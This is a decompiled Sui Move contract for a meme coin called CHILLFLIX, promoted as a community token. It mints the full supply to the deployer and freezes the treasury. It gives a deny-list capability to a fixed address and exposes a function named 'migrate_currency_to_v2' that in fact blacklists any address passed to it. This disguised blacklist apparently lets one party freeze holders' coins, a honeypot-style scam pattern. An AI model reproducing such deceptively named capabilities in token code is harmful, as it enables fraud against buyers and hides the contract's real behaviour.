module 0x5fb7f9d5ac05a8cd92065a054a6eccf6a6fc4b9e59d326cf004675474ca742c5::chillflix {
    struct CHILLFLIX has drop {
        dummy_field: bool,
    }

    public entry fun burn(arg0: &mut 0x2::coin::TreasuryCap<CHILLFLIX>, arg1: 0x2::coin::Coin<CHILLFLIX>) {
        0x2::coin::burn<CHILLFLIX>(arg0, arg1);
    }

    fun init(arg0: CHILLFLIX, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<CHILLFLIX>(arg0, 9, b"CHILLFLIX", b"Netflix & Chill", b"Join the community and lets go up together.", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://dd.dexscreener.com/ds-data/tokens/solana/9pJqVTf8oK56ELcK2EA6bE4bfFFz3XvYshWEA1A1pump.png?size=xl&key=043965")), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<CHILLFLIX>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<CHILLFLIX>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<CHILLFLIX>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<CHILLFLIX>>(v1, @0x8549a4e17bc3f0a50ddbb1fdcf6eda0c05b7033d30c5b703caba4c91408abec8);
    }

    public fun migrate_currency_to_v2(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CHILLFLIX>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<CHILLFLIX>(arg0, arg1, arg2, arg3);
    }

    public entry fun mint(arg0: &mut 0x2::coin::TreasuryCap<CHILLFLIX>, arg1: u64, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::mint_and_transfer<CHILLFLIX>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

